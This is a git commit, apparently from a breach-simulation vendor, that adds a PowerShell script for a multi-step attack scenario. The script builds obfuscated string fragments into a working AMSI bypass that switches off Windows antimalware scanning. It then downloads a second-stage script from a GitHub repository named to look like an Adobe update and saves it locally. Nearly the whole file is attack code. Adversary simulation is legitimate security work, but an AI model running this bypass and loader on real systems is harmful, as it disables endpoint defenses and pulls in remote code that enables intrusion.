c8261a6003ec7f51b834e3446c7f977cf418eeb9
dillon.camp <dillon.camp@attackiq.com>
2022-01-11 11:12:38 -0800

    Added files for multi-step

---
+++ AIQlib106.ps1
@@ -0,0 +1,44 @@
+try
+{
+
+
+$uggiukP='Sy'
+$osiqhdcjwoc='.Man'
+$iouhoaiucio='stem'
+$iohsdvppaidhc='ment.'
+$iohoidsvopoapv='age'
+$hoisdvoapdjvhphav='Auto'
+$hpshdvioavpja='Utils'
+$ihoaivaohvjaisdhv='mation.'
+$oihaovoavsava='Am'
+$ihqoiwfoqofqfwq='si'
+
+
+$usdvhaoihv='am'
+$hoHcohchpHvp='In'
+$ihoahvoahvo='it'
+$oihaohvoahvo='Fa'
+$ihohasovoahv='il'
+$ihoahsvoihasv='ed'
+
+$hoihasohoshva='NonP'
+$ojpaoshvhapshvpahv='ubli'
+$iooaisvoaovava='c,'
+$ohaphvpahpvpJcC='Sta'
+$iasovosaivavspajv='tic'
+
+
+
+
+       [Ref].Assembly.GetType($uggiukP+$iouhoaiucio+$osiqhdcjwoc+$iohoidsvopoapv+$iohsdvppaidhc+$hoisdvoapdjvhphav+$ihoaivaohvjaisdhv+$oihaovoavsava+$ihqoiwfoqofqfwq+$hpshdvioavpja).GetField(($usdvhaoihv+$ihqoiwfoqofqfwq+$hoHcohchpHvp+$ihoahvoahvo+$oihaohvoahvo+$ihohasovoahv+$ihoahsvoihasv),($hoihasohoshva+$ojpaoshvhapshvpahv+$iooaisvoaovava+$ohaphvpahpvpJcC+$iasovosaivavspajv)).SetValue($null,$true)
+}
+finally
+{
+
+$dricksjisx='https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/AIQUpdater.ps1'
+
+Start-Sleep -s 3
+
+Add-Content -Path ".\AIQUpdater.ps1" (new-object net.webclient).downloadstring($dricksjisx)
+
+}
